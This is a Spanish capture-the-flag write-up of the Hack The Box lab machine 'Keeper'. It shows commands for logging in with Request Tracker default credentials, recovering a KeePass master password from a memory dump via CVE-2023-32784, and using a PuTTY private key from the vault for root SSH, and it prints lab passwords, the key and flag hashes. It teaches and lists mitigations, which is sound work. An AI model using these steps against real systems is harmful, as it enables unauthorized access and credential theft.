---
title: "Keeper"
description: "Writeup de Keeper - Hack The Box - Dificultad: Easy"
sidebar:
  badge:
    text: Easy
    variant: success
tags:
  - htb
  - linux
  - easy
  - request-tracker
  - default-credentials
  - keepass
  - cve-2023-32784
  - keepass-dump
  - putty-key
  - ssh-key
---
# 🐧 Keeper
> 📅 Fecha: 2026-05-21
> 🎯 Plataforma: Hack The Box
> ⚙️ SO: Linux (Ubuntu 22.04.3 LTS)
> 🎚️ Dificultad: Easy
> 🌐 IP: `10.129.229.41`
> 👤 Autor: warrior866
---
## 📑 Tabla de Contenidos
- [Resumen Ejecutivo](#-resumen-ejecutivo)
- [Reconocimiento](#-reconocimiento)
- [Enumeración](#-enumeración)
- [Explotación Inicial (Foothold)](#-explotación-inicial-foothold)
- [Escalada de Privilegios](#-escalada-de-privilegios)
- [Flags](#-flags)
- [Lecciones Aprendidas](#-lecciones-aprendidas)
- [Referencias](#-referencias)
---
## 📝 Resumen Ejecutivo
Keeper es una máquina Linux que aloja una instancia de **Request Tracker (RT)** en el subdominio `tickets.keeper.htb` con las **credenciales por defecto** `root:password`. Dentro del panel administrativo, un ticket/comentario revela credenciales temporales del usuario `lnorgaard:Welcome2023!`, que sirven para acceder por SSH y leer la user flag. En el home del usuario hay un fichero `RT30000.zip` con un volcado de memoria de **KeePass** (`KeePassDumpFull.dmp`) y la base de datos cifrada (`passcodes.kdbx`). Aprovechando **CVE-2023-32784** (KeePass 2.x revela casi por completo la master password en memoria), se reconstruye la contraseña maestra `rødgrød med fløde`. Al abrir el KDBX se obtiene la contraseña de `root` y una **clave privada PuTTY** (formato `.ppk`); convirtiéndola a OpenSSH con `puttygen` se hace SSH como root.

| Campo | Valor |
|-------|-------|
| Puntos débiles | Credenciales por defecto en RT, secretos en comentarios, dump de memoria de KeePass al alcance del usuario |
| CVEs | **CVE-2023-32784** (KeePass master password disclosure) |
| Herramientas | nmap, navegador, ssh, sshpass, unzip, `keepass-dump-masterkey`, `keepassxc` / `kpcli`, puttygen |
| Tiempo total | ~3h 30m |
---
## 🔍 Reconocimiento
### Escaneo de puertos (nmap)
```bash
nmap -p- -sS -sV -sC -O -T4 --min-rate=1000 --open -Pn -oN nmap.txt 10.129.229.41
```
```text
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-21 15:37 -0400
Nmap scan report for 10.129.229.41
Host is up (0.15s latency).
Not shown: 65119 closed tcp ports (reset), 414 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 35:39:d4:39:40:4b:1f:61:86:dd:7c:37:bb:4b:98:9e (ECDSA)
|_  256 1a:e9:72:be:8b:b1:05:d5:ef:fe:dd:80:d8:ef:c0:66 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.18.0 (Ubuntu)
OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Nmap done: 1 IP address (1 host up) scanned in 52.29 seconds
```
> 💡 **Análisis:** Solo dos servicios: SSH y nginx. El título HTTP vacío suele indicar que el sitio sirve contenido condicionado al Host header o que hay subdominios/vhosts no anunciados. Toca enumerar subdominios.

### Registro en /etc/hosts
Tras inspeccionar el sitio principal y encontrar referencias al subdominio `tickets`, añado ambos al hosts:
```bash
echo "10.129.229.41 keeper.htb tickets.keeper.htb" | sudo tee -a /etc/hosts
```
```text
10.129.229.41 keeper.htb tickets.keeper.htb
```
---
## 🗂️ Enumeración
### Request Tracker en `tickets.keeper.htb/rt/`
Visitando el subdominio se llega a la interfaz de **Best Practical Request Tracker (RT)**, un sistema de ticketing muy usado por equipos de soporte/IT.
```text
http://tickets.keeper.htb/rt/
```
> 💡 **Análisis:** RT tiene credenciales por defecto **`root:password`** documentadas en su manual. Es uno de los logins más conocidos y siempre vale la pena probarlas antes de fuzzear nada.

### Login con credenciales por defecto
```text
Usuario: root
Contraseña: password
```
> 💡 **Análisis:** Funciona — acceso completo al panel admin de RT. Ahora hay que rastrear usuarios y tickets buscando información jugosa.

### Búsqueda de usuarios y comentarios
Navegando a **Admin → Users** se encuentra el usuario `lnorgaard`. En su ficha hay un comentario que revela su contraseña inicial:
```text
lnorgaard@keeper.htb : Welcome2023!
```
> 💡 **Análisis:** Patrón clásico — alguien dejó una nota de "contraseña inicial" en el campo de comentarios del usuario, accesible para cualquier admin. Probamos esa contraseña contra SSH.
---
## 🚪 Explotación Inicial (Foothold)
### Acceso SSH como lnorgaard
```bash
ssh lnorgaard@keeper.htb
```
```text
lnorgaard@keeper.htb's password:
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-78-generic x86_64)
[...]
You have mail.
Last login: Tue Aug  8 11:31:22 2023 from 10.10.14.23
lnorgaard@keeper:~$ cat user.txt
287326c76c525a03a57313123bbc0a9e
```
📸 *Captura: shell SSH como `lnorgaard` con lectura de `user.txt`.*

> 💡 **Análisis:** Acceso inmediato. El mensaje `You have mail` sugiere que hay correo local interesante; aparte de eso, conviene listar el home buscando artefactos.
---
## 🚀 Escalada de Privilegios
### Vector: dump de memoria de KeePass (CVE-2023-32784)
En el home de `lnorgaard` hay un archivo `RT30000.zip` (nombre que sugiere el ID de un ticket de RT). Lo bajo a local para procesarlo cómodamente:
```bash
sshpass -p 'Welcome2023!' scp lnorgaard@keeper.htb:~/RT30000.zip .
```
```text
ls
 10.129.229.41   KeePassDumpFull.dmp   RT30000.zip
```
```bash
unzip RT30000.zip
```
```text
Archive:  RT30000.zip
  inflating: KeePassDumpFull.dmp
  extracting: passcodes.kdbx
ls
 10.129.229.41   KeePassDumpFull.dmp   passcodes.kdbx   RT30000.zip
```
> 💡 **Análisis:** Dentro del ZIP hay dos archivos clave:
> - **`KeePassDumpFull.dmp`** → un volcado de memoria del proceso KeePass.
> - **`passcodes.kdbx`** → la base de datos cifrada de KeePass.
>
> Esta combinación es exactamente el escenario explotable de **CVE-2023-32784**: cuando el usuario teclea la master password en KeePass 2.x, debido a un bug del control `SecureTextBoxEx`, todos los caracteres excepto el primero quedan recuperables del heap del proceso. Si tenemos un dump del proceso, podemos reconstruir la master password.

### Recuperación de la master password
```bash
git clone https://github.com/CMEPW/keepass-dump-masterkey
```
```text
Cloning into 'keepass-dump-masterkey'...
remote: Enumerating objects: 9, done.
remote: Total 9 (delta 0), reused 6 (delta 0), pack-reused 0 (from 0)
Receiving objects: 100% (9/9), 32.52 KiB | 2.03 MiB/s, done.
```
```bash
python3 poc.py ../KeePassDumpFull.dmp
```
```text
2026-05-21 16:06:07,113 [.] [main] Opened ../KeePassDumpFull.dmp
Possible password: ●,dgr●d med fl●de
Possible password: ●ldgr●d med fl●de
Possible password: ●`dgr●d med fl●de
Possible password: ●-dgr●d med fl●de
Possible password: ●'dgr●d med fl●de
Possible password: ●]dgr●d med fl●de
Possible password: ●Adgr●d med fl●de
Possible password: ●Idgr●d med fl●de
Possible password: ●:dgr●d med fl●de
Possible password: ●=dgr●d med fl●de
Possible password: ●_dgr●d med fl●de
Possible password: ●cdgr●d med fl●de
Possible password: ●Mdgr●d med fl●de
```
> 💡 **Análisis:** El PoC devuelve varios candidatos donde los `●` son caracteres no recuperables (siempre incluyen al menos el primero, que es el que el bug **no** filtra). Mirando el patrón `dgr●d med fl●de`, una búsqueda rápida confirma que es la fonética danesa de un postre tradicional: **`rødgrød med fløde`** (los `●` corresponden a `ø`, la 'o' con barra danesa). Es exactamente la pista del autor de la máquina, ya que la usuaria se llama Lise **Nørgaard** (apellido danés).

**Master password obtenida:**
```text
rødgrød med fløde
```

### Apertura del KDBX
Con la master password se abre `passcodes.kdbx`. Hay dos formas:

Opción gráfica:
```bash
keepassxc passcodes.kdbx
```

Opción CLI (más cómoda para automatizar/copiar valores):
```bash
kpcli --kdb passcodes.kdbx
```
```text
Provide the master password: *************************

KeePass CLI (kpcli) v3.8.1 is ready for operation.

kpcli:/> ls
=== Groups ===
passcodes/
kpcli:/> cd passcodes/Network/
kpcli:/passcodes/Network> ls
=== Entries ===
0. keeper.htb (Ticketing Server)
1. Ticketing System
kpcli:/passcodes/Network> show -f 0

Title: keeper.htb (Ticketing Server)
Uname: root
 Pass: F4><3K0nd!
  URL:
Notes: PuTTY-User-Key-File-3: ssh-rsa
       Encryption: none
       Comment: rsa-key-20230519
       Public-Lines: 6
       AAAAB3NzaC1yc2EAAAADAQABAAABAQCnVqse/hMswGBRQsPsC/EwyxJvc8Wpul/D
       8riCZV30ZbfEF09z0PNUn4DisesKB4x1KtqH0l8vPtRRiEzsBbn+mCpBLHBQ+81T
       EHTc3ChyRYxk899PKSSqKDxUTZeFJ4FBAXqIxoJdpLHIMvh7ZyJNAy34lfcFC+LM
       Cj/c6tQa2IaFfqcVJ+2bnR6UrUVRB4thmJca29JAq2p9BkdDGsiH8F8eanIBA1Tu
       FVbUt2CenSUPDUAw7wIL56qC28w6q/qhm2LGOxXup6+LOjxGNNtA2zJ38P1FTfZQ
       LxFVTWUKT8u8junnLk0kfnM4+bJ8g7MXLqbrtsgr5ywF6Ccxs0Et
       Private-Lines: 14
       AAABAQCB0dgBvETt8/UFNdG/X2hnXTPZKSzQxxkicDw6VR+1ye/t/dOS2yjbnr6j
       oDni1wZdo7hTpJ5ZjdmzwxVCChNIc45cb3hXK3IYHe07psTuGgyYCSZWSGn8ZCih
       kmyZTZOV9eq1D6P1uB6AXSKuwc03h97zOoyf6p+xgcYXwkp44/otK4ScF2hEputY
       f7n24kvL0WlBQThsiLkKcz3/Cz7BdCkn+Lvf8iyA6VF0p14cFTM9Lsd7t/plLJzT
       VkCew1DZuYnYOGQxHYW6WQ4V6rCwpsMSMLD450XJ4zfGLN8aw5KO1/TccbTgWivz
       UXjcCAviPpmSXB19UG8JlTpgORyhAAAAgQD2kfhSA+/ASrc04ZIVagCge1Qq8iWs
       OxG8eoCMW8DhhbvL6YKAfEvj3xeahXexlVwUOcDXO7Ti0QSV2sUw7E71cvl/ExGz
       in6qyp3R4yAaV7PiMtLTgBkqs4AA3rcJZpJb01AZB8TBK91QIZGOswi3/uYrIZ1r
       SsGN1FbK/meH9QAAAIEArbz8aWansqPtE+6Ye8Nq3G2R1PYhp5yXpxiE89L87NIV
       09ygQ7Aec+C24TOykiwyPaOBlmMe+Nyaxss/gc7o9TnHNPFJ5iRyiXagT4E2WEEa
       xHhv1PDdSrE8tB9V8ox1kxBrxAvYIZgceHRFrwPrF823PeNWLC2BNwEId0G76VkA
       AACAVWJoksugJOovtA27Bamd7NRPvIa4dsMaQeXckVh19/TF8oZMDuJoiGyq6faD
       AF9Z7Oehlo1Qt7oqGr8cVLbOT8aLqqbcax9nSKE67n7I5zrfoGynLzYkd3cETnGy
       NNkjMjrocfmxfkvuJ7smEFMg7ZywW7CBWKGozgz67tKz9Is=
       Private-MAC: b0a0fd2edf4f0e557200121aa673732c9e76750739db05adc3ab65ec34c55cb0
```
> 💡 **Análisis:** El entry contiene dos cosas valiosas:
> 1. **Contraseña de root**: `F4><3K0nd!` — aunque SSH como root no funciona con password (suele estar deshabilitado por `PermitRootLogin prohibit-password`).
> 2. **Clave privada PuTTY** en las notas. El formato `PuTTY-User-Key-File-3: ssh-rsa` es nativo de PuTTY (Windows). Hay que convertirlo a formato OpenSSH para usarlo con `ssh`.

### Conversión PPK → PEM y acceso como root
Guardo las notas tal cual en un archivo `keeper.ppk` y lo convierto con `puttygen`:
```bash
nano keeper.ppk
puttygen keeper.ppk -O private-openssh -o keeper.pem
chmod 600 keeper.pem
ssh -i keeper.pem root@keeper.htb
```
```text
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-78-generic x86_64)
[...]
You have new mail.
Last login: Tue Aug  8 19:00:06 2023 from 10.10.14.41
root@keeper:~# id
uid=0(root) gid=0(root) groups=0(root)
root@keeper:~# cat root.txt
9d02c69ae1d106319b1f9304f34f40d1
```
📸 *Captura: shell SSH como `root` con lectura de `root.txt`.*

> 💡 **Análisis:** La clave RSA está autorizada en `/root/.ssh/authorized_keys`, lo que permite saltarse la política de `PermitRootLogin prohibit-password` que bloqueaba la contraseña pero permite key-based auth. La conversión con `puttygen -O private-openssh` es la forma canónica de pasar `.ppk` a `.pem`.
---
## 🏁 Flags
| Flag | Hash |
|------|------|
| user.txt | `287326c76c525a03a57313123bbc0a9e` |
| root.txt | `9d02c69ae1d106319b1f9304f34f40d1` |
---
## 🎓 Lecciones Aprendidas
- **Credenciales por defecto siempre primero.** Antes de fuzzear directorios, brute-forcear o lanzar exploits, probar las credenciales por defecto del software identificado. RT con `root:password`, Tomcat con `tomcat:s3cret`, Jenkins con anonymous read, etc. Una lista mental de las 20-30 combinaciones más típicas ahorra horas.
- **Los comentarios de los usuarios son una mina de oro.** En cualquier sistema multi-usuario (RT, Jira, GitLab, Confluence) revisar los campos descriptivos, notas y comentarios. La gente escribe "le he puesto contraseña inicial X" sin pensar en quién más puede ver eso.
- **CVE-2023-32784 (KeePass) requiere acceso al volcado de memoria del proceso.** No es una vulnerabilidad remota — necesitas (a) un dump de KeePass mientras estaba desbloqueado o (b) volcar tú mismo el proceso. Pero cuando lo consigues, recupera casi toda la master password salvo el primer carácter.
- **El primer carácter de la master password se intuye con contexto.** Aquí los `●` se podían rellenar viendo que el patrón era una frase danesa y que el nombre de la usuaria era Nørgaard. En la práctica esa intuición + un poco de fuerza bruta a las primeras letras hace el truco.
- **PPK → PEM con `puttygen -O private-openssh`.** Conocer este conversor evita perder tiempo. Las máquinas que dejan claves en formato Windows lo hacen sabiendo que muchos olvidan este paso.

### Mitigaciones (lado defensivo)
1. **Cambiar credenciales por defecto en el primer inicio**, sin excepciones. RT permite forzar este cambio con `MasterPassword` config y políticas.
2. **No usar campos descriptivos para credenciales temporales.** Si hay que comunicar una contraseña inicial, usar canales fuera de banda (Signal, llamada) y forzar cambio en primer login.
3. **Actualizar KeePass a ≥ 2.54** donde está parcheado CVE-2023-32784.
4. **No dejar volcados de memoria, ZIPs o backups en homes de usuarios.** Los soporte/escalado de tickets debe procesar el dump en un servidor controlado y eliminarlo tras el análisis.
5. **Auditoría regular de `~/.ssh/authorized_keys` de root**: cualquier clave ahí es equivalente a la contraseña de root. Migrar a SSH bastion + MFA.
---
## 📚 Referencias
- [NVD - CVE-2023-32784](https://nvd.nist.gov/vuln/detail/CVE-2023-32784)
- [vdohney - PoC original de CVE-2023-32784](https://github.com/vdohney/keepass-password-dumper)
- [CMEPW - keepass-dump-masterkey (la que usamos)](https://github.com/CMEPW/keepass-dump-masterkey)
- [HackTricks - KeePass Master Key Disclosure](https://book.hacktricks.xyz/network-services-pentesting/pentesting-kerberos-88#cve-2023-32784)
- [Request Tracker (BestPractical) documentation](https://docs.bestpractical.com/rt/)
- [PuTTYgen - PPK to OpenSSH conversion](https://www.ssh.com/academy/ssh/putty/windows/puttygen#converting-between-putty-and-openssh-keys)
- [GTFOBins](https://gtfobins.github.io/)